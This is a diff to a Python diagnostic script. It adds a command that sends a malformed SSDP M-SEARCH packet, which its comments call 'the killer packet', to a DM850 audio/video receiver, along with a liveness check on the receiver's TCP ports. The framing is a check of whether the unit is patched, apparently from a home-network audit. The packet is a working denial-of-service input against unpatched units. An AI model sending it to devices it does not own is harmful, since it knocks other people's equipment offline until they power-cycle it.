@@ -88,6 +88,49 @@ def prompt(a):
     s.close()
 
 
+# The ST value confirmed to crash an UNPATCHED DM850 (dm850-audit.md §1): a service URN with
+# no version colon after the name. On a PATCHED unit the guard drops it and the unit survives.
+BELKIN_ST = 'urn:Belkin:service:basicevent'
+
+
+def ssdp(a):
+    """Send the Belkin M-SEARCH (the killer packet) to the AVR's SSDP port. On an unpatched,
+    unfiltered unit this hangs the DM850; on a patched unit it is dropped harmlessly. Requires
+    the MikroTik UDP-1900 filter to be LIFTED, or the packet never arrives (false pass)."""
+    msearch = (
+        'M-SEARCH * HTTP/1.1\r\n'
+        'HOST: 239.255.255.250:1900\r\n'
+        'MAN: "ssdp:discover"\r\n'
+        'MX: 1\r\n'
+        f'ST: {a.st}\r\n'
+        '\r\n'
+    ).encode()
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    for _ in range(a.count):
+        s.sendto(msearch, (a.ip, 1900))                       # unicast to the AVR
+        s.sendto(msearch, ('239.255.255.250', 1900))          # and the multicast group
+        time.sleep(0.3)
+    s.close()
+    print(f'sent {a.count}x Belkin M-SEARCH (ST={a.st!r}) to {a.ip}:1900 + multicast. '
+          f'Now run `alive` to check the DM850 survived.')
+
+
+def alive(a):
+    """Is the DM850 responsive? Checks TCP 80/5001/23. All dead = the stack has hung."""
+    up = []
+    for port in (80, 5001, 23):
+        s = try_open(a.ip, port, 1.0)
+        if s:
+            up.append(port)
+            s.close()
+    if up:
+        print(f'ALIVE: {a.ip} answers TCP {up}')
+    else:
+        print(f'HUNG: {a.ip} answers no TCP port (80/5001/23) — the DM850 stack is down; '
+              f'AC power-cycle to recover')
+    return bool(up)
+
+
 def main():
     ap = argparse.ArgumentParser()
     sub = ap.add_subparsers(dest='cmd', required=True)
@@ -99,6 +142,14 @@ def main():
     p.add_argument('--ip', required=True)
     p.add_argument('--poke', action='store_true', help='send one bare newline to see the prompt')
     p.set_defaults(func=prompt)
+    ss = sub.add_parser('ssdp')
+    ss.add_argument('--ip', required=True)
+    ss.add_argument('--st', default=BELKIN_ST)
+    ss.add_argument('--count', type=int, default=3)
+    ss.set_defaults(func=ssdp)
+    al = sub.add_parser('alive')
+    al.add_argument('--ip', required=True)
+    al.set_defaults(func=alive)
     a = ap.parse_args()
     a.func(a)
 
